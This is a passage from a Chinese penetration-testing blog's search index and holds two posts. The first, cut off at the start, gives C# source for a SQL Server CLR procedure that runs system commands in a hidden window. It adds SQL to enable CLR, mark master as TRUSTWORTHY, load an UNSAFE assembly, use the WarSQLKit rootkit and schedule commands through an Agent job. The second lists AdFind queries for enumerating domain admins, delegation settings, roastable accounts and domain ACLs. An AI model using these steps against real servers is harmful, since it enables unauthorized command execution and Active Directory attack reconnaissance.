&#123;        var process &#x3D; new Process();        process.StartInfo.FileName &#x3D; filename;        if (!string.IsNullOrEmpty(arguments))        &#123;            process.StartInfo.Arguments &#x3D; arguments;        &#125;        process.StartInfo.CreateNoWindow &#x3D; true;        process.StartInfo.WindowStyle &#x3D; ProcessWindowStyle.Hidden;        process.StartInfo.UseShellExecute &#x3D; false;        process.StartInfo.RedirectStandardError &#x3D; true;        process.StartInfo.RedirectStandardOutput &#x3D; true;        var stdOutput &#x3D; new StringBuilder();        process.OutputDataReceived +&#x3D; (sender, args) &#x3D;&gt; stdOutput.AppendLine(args.Data);        string stdError &#x3D; null;        try        &#123;            process.Start();            process.BeginOutputReadLine();            stdError &#x3D; process.StandardError.ReadToEnd();            process.WaitForExit();        &#125;        catch (Exception e)        &#123;            SqlContext.Pipe.Send(e.Message);        &#125;        if (process.ExitCode &#x3D;&#x3D; 0)        &#123;            SqlContext.Pipe.Send(stdOutput.ToString());        &#125;        else        &#123;            var message &#x3D; new StringBuilder();            if (!string.IsNullOrEmpty(stdError))            &#123;                message.AppendLine(stdError);            &#125;            if (stdOutput.Length !&#x3D; 0)            &#123;                message.AppendLine(&quot;Std output:&quot;);                message.AppendLine(stdOutput.ToString());            &#125;            SqlContext.Pipe.Send(filename + arguments + &quot; finished with exit code &#x3D; &quot; + process.ExitCode + &quot;: &quot; + message);        &#125;        return stdOutput.ToString();    &#125;&#125;</code></pre><p>编译生成 DLL</p><p><img src="/posts/5beaca16/image-20220320205430338.png" alt="image-20220320205430338"></p><h2 id="启用-CLR"><a href="#启用-CLR" class="headerlink" title="启用 CLR"></a>启用 CLR</h2><h3 id="SQL-Server-2017-版本之前"><a href="#SQL-Server-2017-版本之前" class="headerlink" title="SQL Server 2017 版本之前"></a>SQL Server 2017 版本之前</h3><pre class="language-sql" data-language="sql"><code class="language-sql">sp_configure <span class="token string">'show advanced options'</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">;</span><span class="token keyword">RECONFIGURE</span><span class="token punctuation">;</span> <span class="token comment">-- 显示高级选项</span>sp_configure <span class="token string">'clr enabled'</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">;</span><span class="token keyword">RECONFIGURE</span><span class="token punctuation">;</span> <span class="token comment">-- 启用CLR</span><span class="token keyword">ALTER</span> <span class="token keyword">DATABASE</span> master <span class="token keyword">SET</span> TRUSTWORTHY <span class="token keyword">ON</span><span class="token punctuation">;</span> <span class="token comment">-- 将存储.Net程序集的数据库配置为可信赖的</span></code></pre><h3 id="SQL-Server-2017-版本及之后"><a href="#SQL-Server-2017-版本及之后" class="headerlink" title="SQL Server 2017 版本及之后"></a>SQL Server 2017 版本及之后</h3><pre class="language-sql" data-language="sql"><code class="language-sql">sp_configure <span class="token string">'show advanced options'</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">;</span><span class="token keyword">RECONFIGURE</span><span class="token punctuation">;</span>sp_configure <span class="token string">'clr enabled'</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">;</span><span class="token keyword">RECONFIGURE</span><span class="token punctuation">;</span>sp_add_trusted_assembly <span class="token variable">@hash</span><span class="token operator">=</span> <span class="token operator">&lt;</span>SHA512 <span class="token keyword">of</span> DLL<span class="token operator">></span><span class="token punctuation">;</span> <span class="token comment">-- 将某程序集的SHA512哈希值添加到可信程序集列表中</span></code></pre><h2 id="程序集的导入和创建"><a href="#程序集的导入和创建" class="headerlink" title="程序集的导入和创建"></a>程序集的导入和创建</h2><p>通过十六进制字符串创建程序集</p><pre class="language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">CREATE</span> ASSEMBLY clrassem <span class="token keyword">from</span> <span class="token operator">&lt;</span>HEX STRING<span class="token operator">></span> <span class="token keyword">WITH</span> PERMISSION_SET <span class="token operator">=</span> UNSAFE</code></pre><pre class="language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">CREATE</span> ASSEMBLY <span class="token punctuation">[</span>CLR<span class="token punctuation">]</span>  <span class="token keyword">AUTHORIZATION</span> <span class="token punctuation">[</span>dbo<span class="token punctuation">]</span>  <span class="token keyword">FROM</span> <span class="token number">0x4d5a</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>  <span class="token keyword">WITH</span> PERMISSION_SET <span class="token operator">=</span> UNSAFE<span class="token punctuation">;</span>GO</code></pre><p>创建存储过程，以从程序集运行代码</p><pre class="language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">CREATE</span> <span class="token keyword">PROCEDURE</span> debugrun <span class="token keyword">AS</span> EXTERNAL NAME clrassem<span class="token punctuation">.</span>StoredProcedures<span class="token punctuation">.</span>runner</code></pre><pre class="language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">CREATE</span> <span class="token keyword">PROCEDURE</span> <span class="token punctuation">[</span>dbo<span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token punctuation">[</span>ExecCommand<span class="token punctuation">]</span><span class="token variable">@cmd</span> NVARCHAR <span class="token punctuation">(</span>MAX<span class="token punctuation">)</span><span class="token keyword">AS</span> EXTERNAL NAME <span class="token punctuation">[</span>CLR<span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token punctuation">[</span>StoredProcedures<span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token punctuation">[</span>ExecCommand<span class="token punctuation">]</span>go</code></pre><h2 id="利用-CLR-执行系统命令"><a href="#利用-CLR-执行系统命令" class="headerlink" title="利用 CLR 执行系统命令"></a>利用 CLR 执行系统命令</h2><pre class="language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">exec</span> dbo<span class="token punctuation">.</span>ExecCommand <span class="token string">"whoami /all"</span></code></pre><h2 id="删除存储过程、程序集以及受信任的哈希值"><a href="#删除存储过程、程序集以及受信任的哈希值" class="headerlink" title="删除存储过程、程序集以及受信任的哈希值"></a>删除存储过程、程序集以及受信任的哈希值</h2><h3 id="SQL-Server-2017-之前的版本"><a href="#SQL-Server-2017-之前的版本" class="headerlink" title="SQL Server 2017 之前的版本"></a>SQL Server 2017 之前的版本</h3><pre class="language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">ALTER</span> <span class="token keyword">DATABASE</span> <span class="token operator">&lt;</span>CONNECTED <span class="token keyword">DATABASE</span><span class="token operator">></span> <span class="token keyword">SET</span> TRUSTWORTHY <span class="token keyword">OFF</span></code></pre><h3 id="SQL-Server-2017-及更高版本"><a href="#SQL-Server-2017-及更高版本" class="headerlink" title="SQL Server 2017 及更高版本"></a>SQL Server 2017 及更高版本</h3><pre class="language-sql" data-language="sql"><code class="language-sql">sp_drop_trusted_assembly <span class="token variable">@hash</span><span class="token operator">=</span><span class="token operator">&lt;</span>SHA512 <span class="token keyword">of</span> DLL<span class="token operator">></span></code></pre><h3 id="通用"><a href="#通用" class="headerlink" title="通用"></a>通用</h3><pre class="language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">DROP</span> <span class="token keyword">PROCEDURE</span> debugrun<span class="token punctuation">;</span><span class="token keyword">DROP</span> ASSEMBLY clrassem<span class="token punctuation">;</span>sp_configure <span class="token string">'clr strict security'</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">;</span><span class="token keyword">RECONFIGURE</span>sp_configure <span class="token string">'show advanced options'</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">;</span><span class="token keyword">RECONFIGURE</span></code></pre><h2 id="WarSQLKit"><a href="#WarSQLKit" class="headerlink" title="WarSQLKit"></a>WarSQLKit</h2><p>WarSQLKit 是一个针对 MSSQL CLR 进行利用的工具，有以下两个版本</p><ul><li>WarSQLKit 是完全版本，内置多种功能。</li><li>WarSQLKitMinimal 是简化版，只能执行命令。</li></ul><p>项目地址：<a href="https://github.com/EPICROUTERSS/MSSQL-Fileless-Rootkit-WarSQLKit">https://github.com/EPICROUTERSS/MSSQL-Fileless-Rootkit-WarSQLKit</a></p><p>导入方式和前面差不多</p><pre class="language-sql" data-language="sql"><code class="language-sql"><span class="token comment"># 导入</span><span class="token keyword">CREATE</span> ASSEMBLY <span class="token punctuation">[</span>WarSQLKit<span class="token punctuation">]</span>    <span class="token keyword">AUTHORIZATION</span> <span class="token punctuation">[</span>dbo<span class="token punctuation">]</span>    <span class="token keyword">FROM</span> <span class="token number">0x4D5A</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>    <span class="token keyword">WITH</span> PERMISSION_SET <span class="token operator">=</span> UNSAFE<span class="token punctuation">;</span>GO<span class="token comment"># 创建</span><span class="token keyword">CREATE</span> <span class="token keyword">PROCEDURE</span> sp_cmdExec<span class="token variable">@Command</span> <span class="token punctuation">[</span>nvarchar<span class="token punctuation">]</span><span class="token punctuation">(</span>max<span class="token punctuation">)</span><span class="token keyword">WITH</span> <span class="token keyword">EXECUTE</span> <span class="token keyword">AS</span> CALLER<span class="token keyword">AS</span>EXTERNAL NAME WarSQLKit<span class="token punctuation">.</span>StoredProcedures<span class="token punctuation">.</span>CmdExecGO</code></pre><p>用法见 README</p><h1 id="SQL-Server-Agent-Job-代理执行计划任务利用"><a href="#SQL-Server-Agent-Job-代理执行计划任务利用" class="headerlink" title="SQL Server Agent Job 代理执行计划任务利用"></a>SQL Server Agent Job 代理执行计划任务利用</h1><p>SQL Server 代理是一项 Microsoft Windows 服务，它执行计划的管理任务，这些任务在 SQL Server 中称为作业</p><p>在 Sql Server 配置管理器，启用 SQL Server 代理，注意 Express 版本 Sql Server 是无法启用的</p><p>创建计划任务</p><pre class="language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">USE</span> msdb<span class="token punctuation">;</span> <span class="token keyword">EXEC</span> dbo<span class="token punctuation">.</span>sp_add_job <span class="token variable">@job_name</span> <span class="token operator">=</span> N<span class="token string">'test_powershell_job1'</span><span class="token punctuation">;</span> <span class="token keyword">EXEC</span> sp_add_jobstep <span class="token variable">@job_name</span> <span class="token operator">=</span> N<span class="token string">'test_powershell_job1'</span><span class="token punctuation">,</span> <span class="token variable">@step_name</span> <span class="token operator">=</span> N<span class="token string">'test_powershell_name1'</span><span class="token punctuation">,</span> <span class="token variable">@subsystem</span> <span class="token operator">=</span> N<span class="token string">'PowerShell'</span><span class="token punctuation">,</span> <span class="token variable">@command</span> <span class="token operator">=</span> N<span class="token string">'c:\windows\system32\cmd.exe /c whoami >c:\\1.txt'</span><span class="token punctuation">,</span> <span class="token variable">@retry_attempts</span> <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token variable">@retry_interval</span> <span class="token operator">=</span> <span class="token number">5</span> <span class="token punctuation">;</span><span class="token keyword">EXEC</span> dbo<span class="token punctuation">.</span>sp_add_jobserver <span class="token variable">@job_name</span> <span class="token operator">=</span> N<span class="token string">'test_powershell_job1'</span><span class="token punctuation">;</span> <span class="token keyword">EXEC</span> dbo<span class="token punctuation">.</span>sp_start_job N<span class="token string">'test_powershell_job1'</span><span class="token punctuation">;</span></code></pre><h1 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h1><p><a href="https://xz.aliyun.com/t/9475">https://xz.aliyun.com/t/9475</a></p>]]></content>
      
      
      
        <tags>
            
            <tag> MSSQL </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Adfind 常用命令</title>
      <link href="/posts/1385ebc.html"/>
      <url>/posts/1385ebc.html</url>
      
        <content type="html"><![CDATA[<h1 id="下载地址"><a href="#下载地址" class="headerlink" title="下载地址"></a>下载地址</h1><p><a href="http://www.joeware.net/freetools/tools/adfind/index.htm">http://www.joeware.net/freetools/tools/adfind/index.htm</a></p><h1 id="常用命令"><a href="#常用命令" class="headerlink" title="常用命令"></a>常用命令</h1><h2 id="查找受-AD-保护的域中的所有用户"><a href="#查找受-AD-保护的域中的所有用户" class="headerlink" title="查找受 AD 保护的域中的所有用户"></a>查找受 AD 保护的域中的所有用户</h2><pre class="language-bash" data-language="bash"><code class="language-bash">Adfind.exe -b <span class="token assign-left variable">DC</span><span class="token operator">=</span>domain,DC<span class="token operator">=</span>com -f <span class="token string">"&amp;(objectcategory=person)(samaccountname=*)(admincount=1)"</span> -dn</code></pre><h2 id="查找域中受-AD-保护的所有组"><a href="#查找域中受-AD-保护的所有组" class="headerlink" title="查找域中受 AD 保护的所有组"></a>查找域中受 AD 保护的所有组</h2><pre class="language-bash" data-language="bash"><code class="language-bash">Adfind.exe -b <span class="token assign-left variable">DC</span><span class="token operator">=</span>domain,DC<span class="token operator">=</span>com -f <span class="token string">"&amp;(objectcategory=group)(admincount=1)"</span> -dn</code></pre><h2 id="查看域管账户"><a href="#查看域管账户" class="headerlink" title="查看域管账户"></a>查看域管账户</h2><pre class="language-bash" data-language="bash"><code class="language-bash">AdFind -default -f <span class="token string">"(&amp;(|(&amp;(objectCategory=person)(objectClass=user))(objectCategory=group))(adminCount=1))"</span> -dn</code></pre><h2 id="列出域控制器名称"><a href="#列出域控制器名称" class="headerlink" title="列出域控制器名称"></a>列出域控制器名称</h2><pre class="language-bash" data-language="bash"><code class="language-bash">Adfind.exe -sc dclist</code></pre><h2 id="查看域控版本"><a href="#查看域控版本" class="headerlink" title="查看域控版本"></a>查看域控版本</h2><pre class="language-bash" data-language="bash"><code class="language-bash">Adfind.exe -schema -s base objectversion</code></pre><h2 id="查看域内在线的计算机"><a href="#查看域内在线的计算机" class="headerlink" title="查看域内在线的计算机"></a>查看域内在线的计算机</h2><pre class="language-bash" data-language="bash"><code class="language-bash">AdFind.exe -sc computers_active name operatingSystem</code></pre><h2 id="查看域内-GPO-信息"><a href="#查看域内-GPO-信息" class="headerlink" title="查看域内 GPO 信息"></a>查看域内 GPO 信息</h2><pre class="language-bash" data-language="bash"><code class="language-bash">Adfind.exe -sc gpodmp</code></pre><h2 id="非约束委派"><a href="#非约束委派" class="headerlink" title="非约束委派"></a>非约束委派</h2><h3 id="查询用户"><a href="#查询用户" class="headerlink" title="查询用户"></a>查询用户</h3><pre class="language-bash" data-language="bash"><code class="language-bash">AdFind.exe -b <span class="token string">"DC=merak,DC=local"</span> -f <span class="token string">"(&amp;(samAccountType=805306368)(userAccountControl:1.2.840.113556.1.4.803:=524288))"</span> cn distinguishedName</code></pre><h3 id="查询主机"><a href="#查询主机" class="headerlink" title="查询主机"></a>查询主机</h3><pre class="language-bash" data-language="bash"><code class="language-bash">AdFind.exe -b <span class="token string">"DC=merak,DC=local"</span> -f <span class="token string">"(&amp;(samAccountType=805306369)(userAccountControl:1.2.840.113556.1.4.803:=524288))"</span> cn distinguishedName</code></pre><h2 id="约束委派"><a href="#约束委派" class="headerlink" title="约束委派"></a>约束委派</h2><h3 id="查询用户-1"><a href="#查询用户-1" class="headerlink" title="查询用户"></a>查询用户</h3><pre class="language-bash" data-language="bash"><code class="language-bash">AdFind.exe -b <span class="token string">"DC=merak,DC=local"</span> -f <span class="token string">"(&amp;(samAccountType=805306368)(msds-allowedtodelegateto=*))"</span> cn distinguishedName msds-allowedtodelegateto</code></pre><h3 id="查询主机-1"><a href="#查询主机-1" class="headerlink" title="查询主机"></a>查询主机</h3><pre class="language-bash" data-language="bash"><code class="language-bash">AdFind.exe -b <span class="token string">"DC=merak,DC=local"</span> -f <span class="token string">"(&amp;(samAccountType=805306369)(msds-allowedtodelegateto=*))"</span> cn distinguishedName msds-allowedtodelegateto</code></pre><h2 id="查看域内高权限的-SPN-服务主体名称"><a href="#查看域内高权限的-SPN-服务主体名称" class="headerlink" title="查看域内高权限的 SPN 服务主体名称"></a>查看域内高权限的 SPN 服务主体名称</h2><pre class="language-bash" data-language="bash"><code class="language-bash">Adfind.exe -b <span class="token string">"dc=merak,dc=local"</span> -f <span class="token string">"&amp;(servicePrincipalName=*)(admincount=1)"</span> servicePrincipalName</code></pre><h2 id="查看可-AS-REP-Roasting-用户"><a href="#查看可-AS-REP-Roasting-用户" class="headerlink" title="查看可 AS-REP Roasting 用户"></a>查看可 AS-REP Roasting 用户</h2><pre class="language-bash" data-language="bash"><code class="language-bash">Adfind.exe -b <span class="token string">"dc=merak,dc=local"</span> -f <span class="token string">"useraccountcontrol:1.2.840.113556.1.4.803:=4194304"</span> -dn</code></pre><h2 id="导出整个域的-ACL"><a href="#导出整个域的-ACL" class="headerlink" title="导出整个域的 ACL"></a>导出整个域的 ACL</h2><pre class="language-bash" data-language="bash"><code class="language-bash">Adfind.exe -sc getacls -sddlfilter <span class="token punctuation">;</span><span class="token punctuation">;</span><span class="token punctuation">;</span><span class="token punctuation">;</span><span class="token punctuation">;</span> -recmute</code></pre>]]></content>
      
      
      
        <tags>
            
            <tag> Tools </tag>
            
        </tags>
      
    </entry>
    
    
  
  
</search>
